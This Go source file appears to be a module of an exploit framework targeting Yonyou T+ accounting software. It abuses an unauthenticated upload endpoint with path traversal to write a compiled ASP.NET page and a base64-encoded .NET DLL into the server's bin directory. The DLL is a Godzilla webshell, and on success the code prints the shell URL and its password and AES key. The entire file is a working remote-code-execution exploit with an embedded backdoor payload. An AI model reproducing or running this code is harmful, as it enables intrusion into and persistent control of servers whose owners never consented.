package exp_yongyouTplus

import (
	"encoding/base64"
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"github.com/lz520520/railgunlib/pkg/utils/lznet/lzhttp"
	"strings"
)

type Exp_Upload struct {
	exp_templates.ExpTemplate
}

func (self *Exp_Upload) Attack_upload1() (expResult exp_model.ExpResult) {
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	target := goutils.AppendUri(self.Params.BaseParam.Target, "/tplus/SM/SetupAccount/Upload.aspx?login=1")
	compiled, _ := base64.StdEncoding.DecodeString("77u/PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjxwcmVzZXJ2ZSByZXN1bHRUeXBlPSIzIiB2aXJ0dWFsUGF0aD0iLzEuYXNweCIgaGFzaD0iODhlZWM3YjFhIiBmaWxlaGFzaD0iZmZmZmRmNmMzYWU2MmU1MiIgZmxhZ3M9IjExMDAwMCIgYXNzZW1ibHk9IkFwcF9XZWJfbDI1MmR4aW4iIHR5cGU9IkFTUC5fMV9hc3B4Ij4NCiAgICA8ZmlsZWRlcHM+DQogICAgICAgIDxmaWxlZGVwIG5hbWU9Ii8xLmFzcHgiIC8+DQogICAgPC9maWxlZGVwcz4NCjwvcHJlc2VydmU+")
	dll, _ := base64.StdEncoding.DecodeString("TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDABbLdWMAAAAAAAAAAOAAAiELAQsAABIAAAAGAAAAAAAArjEAAAAgAAAAQAAAAAAAEAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACAAAAAAgAAAAAAAAMAQIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAFQxAABXAAAAAEAAAMgCAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAwAAAAcMAAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAtBEAAAAgAAAAEgAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAMgCAAAAQAAAAAQAAAAUAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAAGAAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAACQMQAAAAAAAEgAAAACAAUAPCMAAOAMAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABMwAwBCAAAAAQAAEQIoCAAACgAAAnIBAABwKAkAAAoAfgEAAAQLBy0jABeNFAAAAQoGFnIBAABwogIGKAoAAAqAAgAABBeAAQAABAAAKgAAEzABABYAAAACAAARAAJvCwAACm8MAAAKdAUAAAEKKwAGKgAAEzABAAcAAAADAAARABYKKwAGKgATMAEAEQAAAAQAABEAAm8LAAAKbw0AAAoKKwAGKnIAAm8OAAAKAAMC/gYGAAAGcw8AAApvEAAACgAqAAAbMAcAigEAAAUAABEAAHITAABwCnMRAAAKKBIAAAoGbxMAAAooEgAACgZvEwAACm8UAAAKAm8LAAAKbxUAAAoCbwsAAApvFQAACm8WAAAKbxcAAAoWAm8LAAAKbxUAAApvFgAACm8YAAAKCwJvCwAACm8ZAAAKcjUAAHBvGgAAChT+ARb+ARMFEQUtYwACbwsAAApvGQAACnI1AABw0B0AAAEoGwAACnJFAABwF40eAAABEwYRBhbQAQAAGygbAAAKohEGKBwAAAoUF40EAAABEwcRBxYHohEHbx0AAAp0HQAAAW8eAAAKAAA4nQAAAAACbwsAAApvGQAACnI1AABwbxoAAAp0HQAAAXJPAABwbx8AAAoMcyAAAAoNCAlvIQAACiYIAm8LAAAKbyEAAAomCAdvIQAACiYIbyIAAAomCW8jAAAKEwQJbyQAAAoAAm8LAAAKbyUAAApzEQAACigSAAAKBm8TAAAKKBIAAAoGbxMAAApvJgAAChEEFhEEjmlvGAAACm8nAAAKAAAA3gUmAADeAAAqAABBHAAAAAAAAAEAAACCAQAAgwEAAAUAAAAlAAABpgACKCgAAAoAAgIoBQAABgACfgIAAAQoKQAACgACKCoAAApvKwAACgAqAAATMAEACwAAAAYAABEAIAUVAAAKKwAGKioAAgMoLAAACgAqKgIoLQAACgAAACoAAAATMAEACwAAAAcAABEAcwEAAAYKKwAGKgBCU0pCAQABAAAAAAAMAAAAdjQuMC4zMDMxOQAAAAAFAGwAAAAMBAAAI34AAHgEAABYBgAAI1N0cmluZ3MAAAAA0AoAAFgAAAAjVVMAKAsAABAAAAAjR1VJRAAAADgLAACoAQAAI0Jsb2IAAAAAAAAAAgAAAVcXogkJAAAAAPolMwAWAAABAAAAJQAAAAMAAAACAAAACwAAAAQAAAACAAAALQAAAAsAAAAHAAAAAQAAAAMAAAADAAAAAQAAAAEAAAADAAAAAAAKAAEAAAAAAAYAbQBfAAYAigByAAYAoABUAAoAvQC2AAYA/gDrAAYALwFUAAYAagFfAAYAeQFfAAYAuAFUAA4AUgI6AgoAeQJpAgoAkAJpAgoAugKgAgoA5gLTAjsA+gIAAAoAKQMJAwoASQMJAwoAeAPTAgYAlQNfAAoAwAO2AAYA7gPrAAYADARfAAoATgQxBAoAagReBAoAiAQxBAoAmwQxBAYAvARUAAYABQVyAAoAPQUrBQoARgW2AAoASwW2AAoAbwUrBQoAhAUrBQoAuAWuBQoA3QWuBQYA7AVUAAoAIga2AAAAAAABAAAAAAABAAEAAQAQAB8AJwAFAAEAAQAAABAAKwBOABEAAwAKABEAxAATABEA0gAWAFAgAAAAAIYY5QAZAAEAoCAAAAAAhAgNAR0AAQDEIAAAAADECBkBIgABANggAAAAAIQIPwEmAAEA9SAAAAAAgQBXASsAAQAUIQAAAACBAIEBMQACAMgiAAAAAMQAlAEZAAQA9CIAAAAAxgCoATkABAALIwAAAADGAMQBPQAEABYjAAAAAIEY5QAZAAUAJCMAAAAAkQABAlEABQAAAAEAFAIAAAEAGwIAAAIAHwIAAAEAMgICAAkAAgANAFEA5QBVAFkA5QBbAGkA5QBhAHEA5QBmAIEA5QBsAIkA5QAZAJEA5QAZAAkA5QAZAJkApQNhAAkAxwN2AEEA4gOCAEkADQGHAEkAPwEmAAkA+gMZALEA5QCaAEEAGQSgALkA5QAZAMEAcwSmAMEAfwSrAMkArASxAEkAyAS6ANkA1AQ5ANkA5gS/ANEA8QTFAEkAFgXOAOEAIgXTAPEAXQXYAPEAegXiAAkBjwXsAOEAlgXzAOkAnwXTABEB5QAZACEAxQX5ACEAzAX+ABEB1QUCARkB5AUZAEkA+QUHAckABgaxACEBFgYNAQkAlAEZAAkALAYlAQkAyAS6ANkARwYZAAkAxAE9ACEA5QAZACAAOwBxAC4ACwAyAS4AEwBPAS4AMwCHAS4AGwBVAS4AIwB1AS4AKwB+AaAAOwBxAOAAOwBxAAABOwBxACABOwBxAHwAjACRAJUAEwEqAS4BAgABAAAA0wFDAAAA2wFIAAAA7QFMAAIAAgADAAIAAwAFAAIABAAHAN8ABIAAAAAAAAAAAAAAAAAAAAAAZwMAAAQAAAAAAAAAAAAAAAEAVAAAAAAABAAAAAAAAAAAAAAACgCtAAAAAAAEAAAAAAAAAAAAAAAKALYAAAAAAAAAADxNb2R1bGU+AEFwcF9XZWJfbDI1MmR4aW4uZGxsAF8xX2FzcHgAQVNQAEZhc3RPYmplY3RGYWN0b3J5X2FwcF93ZWJfbDI1MmR4aW4AX19BU1AAU3lzdGVtLldlYgBTeXN0ZW0uV2ViLlVJAFBhZ2UAU3lzdGVtLldlYi5TZXNzaW9uU3RhdGUASVJlcXVpcmVzU2Vzc2lvblN0YXRlAElIdHRwSGFuZGxlcgBtc2NvcmxpYgBTeXN0ZW0AT2JqZWN0AF9faW5pdGlhbGl6ZWQAX19maWxlRGVwZW5kZW5jaWVzAC5jdG9yAFN5c3RlbS5XZWIuUHJvZmlsZQBEZWZhdWx0UHJvZmlsZQBnZXRfUHJvZmlsZQBnZXRfU3VwcG9ydEF1dG9FdmVudHMASHR0cEFwcGxpY2F0aW9uAGdldF9BcHBsaWNhdGlvbkluc3RhbmNlAF9fQnVpbGRDb250cm9sVHJlZQBIdG1sVGV4dFdyaXRlcgBDb250cm9sAF9fUmVuZGVyX19jb250cm9sMQBGcmFtZXdvcmtJbml0aWFsaXplAEdldFR5cGVIYXNoQ29kZQBIdHRwQ29udGV4dABQcm9jZXNzUmVxdWVzdABQcm9maWxlAFN1cHBvcnRBdXRvRXZlbnRzAEFwcGxpY2F0aW9uSW5zdGFuY2UAQ3JlYXRlX0FTUF9fMV9hc3B4AF9fY3RybABfX3cAcGFyYW1ldGVyQ29udGFpbmVyAGNvbnRleHQAU3lzdGVtLkNvZGVEb20uQ29tcGlsZXIAR2VuZXJhdGVkQ29kZUF0dHJpYnV0ZQBTeXN0ZW0uU2VjdXJpdHkAU2VjdXJpdHlSdWxlc0F0dHJpYnV0ZQBTZWN1cml0eVJ1bGVTZXQAU3lzdGVtLlJ1bnRpbWUuVmVyc2lvbmluZwBUYXJnZXRGcmFtZXdvcmtBdHRyaWJ1dGUAU3lzdGVtLkRpYWdub3N0aWNzAERlYnVnZ2FibGVBdHRyaWJ1dGUARGVidWdnaW5nTW9kZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAEFwcF9XZWJfbDI1MmR4aW4ARGVidWdnZXJOb25Vc2VyQ29kZUF0dHJpYnV0ZQBUZW1wbGF0ZUNvbnRyb2wAc2V0X0FwcFJlbGF0aXZlVmlydHVhbFBhdGgAU3RyaW5nAEdldFdyYXBwZWRGaWxlRGVwZW5kZW5jaWVzAGdldF9Db250ZXh0AFByb2ZpbGVCYXNlAEluaXRpYWxpemVDdWx0dXJlAFJlbmRlck1ldGhvZABTZXRSZW5kZXJNZXRob2REZWxlZ2F0ZQBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5AFJpam5kYWVsTWFuYWdlZABTeXN0ZW0uVGV4dABFbmNvZGluZwBnZXRfRGVmYXVsdABHZXRCeXRlcwBTeW1tZXRyaWNBbGdvcml0aG0ASUNyeXB0b1RyYW5zZm9ybQBDcmVhdGVEZWNyeXB0b3IASHR0cFJlcXVlc3QAZ2V0X1JlcXVlc3QAZ2V0X0NvbnRlbnRMZW5ndGgAQmluYXJ5UmVhZABUcmFuc2Zvcm1GaW5hbEJsb2NrAEh0dHBTZXNzaW9uU3RhdGUAZ2V0X1Nlc3Npb24AZ2V0X0l0ZW0AU3lzdGVtLlJlZmxlY3Rpb24AQXNzZW1ibHkAVHlwZQBSdW50aW1lVHlwZUhhbmRsZQBHZXRUeXBlRnJvbUhhbmRsZQBNZXRob2RJbmZvAEdldE1ldGhvZABNZXRob2RCYXNlAEludm9rZQBzZXRfSXRlbQBDcmVhdGVJbnN0YW5jZQBTeXN0ZW0uSU8ATWVtb3J5U3RyZWFtAEVxdWFscwBUb1N0cmluZwBUb0FycmF5AFN0cmVhbQBEaXNwb3NlAEh0dHBSZXNwb25zZQBnZXRfUmVzcG9uc2UAQ3JlYXRlRW5jcnlwdG9yAEJpbmFyeVdyaXRlAEV4Y2VwdGlvbgBBZGRXcmFwcGVkRmlsZURlcGVuZGVuY2llcwBWYWxpZGF0ZUlucHV0AAAAAAARfgAvADEALgBhAHMAcAB4AAAhNwA5ADEAZgBlAGUANwA0ADgAYgAwADAAOQBlAGUAOQAAD3AAYQB5AGwAbwBhAGQAAAlMAG8AYQBkAAAFTABZAAAAAABMm6tzKjsFQ5IO7StK5X3HAAiwP19/EdUKOgi3elxWGTTgiQIGAgIGHAMgAAEEIAASFQMgAAIEIAASGQUgAQESCAcgAgESHRIhAyAACAUgAQESJQQoABIVAygAAgQoABIZAwAAHAUgAgEODgUgAQERMQQgAQEOBSABARE9BCABAQgEAQAAAAUgARwdDgUHAh0OAgQgABIlBCAAElUEBwESFQMHAQIEBwESGQUgAgEcGAUgAQESWQQAABJhBSABHQUOCCACEmkdBR0FBCAAEm0FIAEdBQgIIAMdBR0FCAgEIAAScQQgARwOBgABEnkRfQIdBQkgAhKAgQ4dEnkGIAIcHB0cBSACAQ4cBCABAhwDIAAOBCAAHQUFIAASgJEFIAEBHQURBwgOHQUcEoCJHQUC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")
	data := []lzhttp.PostMultiPart{
		{
			"File1",
			"../../../bin/1.aspx.cdcab7d2.compiled",
			"image/jpeg",
			[]byte(compiled),
		},
	}
	// 发送请求
	httpresp := self.HttpPostMultiWithoutRedirect(target, data, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	if httpresp.Resp.StatusCode == 200 && strings.Contains(httpresp.Body, `UploadFileName`) {
		data := []lzhttp.PostMultiPart{
			{
				"File1",
				"../../../bin/App_Web_l252dxin.dll",
				"image/jpeg",
				[]byte(dll),
			},
		}
		// 发送请求
		httpresp := self.HttpPostMultiWithoutRedirect(target, data, headers)
		if httpresp.Err != nil {
			expResult.Err = httpresp.Err.Error()
			return
		}
		if httpresp.Resp.StatusCode == 200 && strings.Contains(httpresp.Body, `UploadFileName`) {
			shellUrl := goutils.AppendUri(self.Params.BaseParam.Target, "/tplus/1.aspx?login=1")
			self.EchoSuccessMsg("shell: " + shellUrl)
			expResult.Status = true
			self.EchoSuccessMsg("哥斯拉密码：EncryptedData，密钥：8685a970885329ea，CShapDynamicPayload，CSHAP_AES_RAW")
			self.EchoSuccessMsg("自行测试shell")
		} else {
			expResult.Status = false
		}
	} else {
		expResult.Status = false
	}
	return
}

func init() {

	exp_register.ExpStructRegister(&Exp_Upload{}, "exp_ Upload.yml")

}
